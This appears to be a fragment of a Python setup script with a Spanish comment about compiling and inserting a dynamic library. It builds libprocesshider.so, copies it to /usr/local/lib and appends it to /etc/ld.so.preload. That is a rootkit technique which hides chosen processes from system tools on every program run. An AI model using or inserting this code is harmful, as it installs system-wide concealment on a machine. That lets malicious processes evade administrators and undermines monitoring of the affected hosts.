###############################################
#COMPILACION E INSERCION LIBRERIA DINAMICA
os.system("make")
os.system("mv libprocesshider.so /usr/local/lib/")
os.system("echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload")